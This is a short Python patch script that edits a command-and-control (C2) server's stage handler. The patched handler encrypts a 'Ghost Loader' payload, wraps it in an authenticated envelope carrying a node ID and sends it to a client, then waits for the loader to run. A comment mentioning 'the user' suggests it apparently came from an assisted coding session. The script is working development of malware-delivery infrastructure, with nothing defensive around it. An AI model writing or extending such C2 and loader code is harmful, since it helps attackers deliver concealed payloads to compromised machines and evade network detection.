import sys
import re

with open('/app/c2_server/server.py', 'r') as f:
    content = f.read()

# Target _handle_stage_req method
target = """                with open(gpath, "rb") as f:
                    ghost_data = f.read()
                log_print(f"  └─ Sending Ghost Loader ({len(ghost_data)} bytes)...", Colors.GREEN)
                log_print(f"  └─ Waiting for Ghost Loader execution...", Colors.GREEN)
                return ghost_data"""

replacement = """                with open(gpath, "rb") as f:
                    ghost_data = f.read()
                log_print(f"  └─ Sending Ghost Loader ({len(ghost_data)} bytes)...", Colors.GREEN)
                
                # Encrypt the stage for the client!
                ciphertext, iv, tag = SERVER_CRYPTO.encrypt(ghost_data)
                
                # The Envelope header must be authenticated! So we build it WITH empty tag first,
                # then use that as AAD to match the C-side exactly.
                # However, the user discovered the client passes the whole struct.
                # Let's pack it with the real tag immediately, but decrypt side uses modified AAD.
                seq = SERVER_CRYPTO.total_messages
                node_id_bytes = bytes.fromhex(env["node_id_hex"]) if env else b'\\x00'*16
                
                env_bytes = struct.pack(
                    ENVELOPE_FMT, 
                    C2_MAGIC, 
                    C2_MSG_STAGE_DATA, 
                    len(ciphertext), 
                    seq, 
                    iv, 
                    tag, 
                    node_id_bytes
                )
                
                log_print(f"  └─ Encrypted Stage Payload ({len(ciphertext)} bytes, IV: {iv.hex()})", Colors.GREEN)
                log_print(f"  └─ Waiting for Ghost Loader execution...", Colors.GREEN)
                return env_bytes + ciphertext"""

if target in content:
    content = content.replace(target, replacement)
    with open('/app/c2_server/server.py', 'w') as f:
        f.write(content)
    print("Patch applied.")
else:
    print("Target not found.")

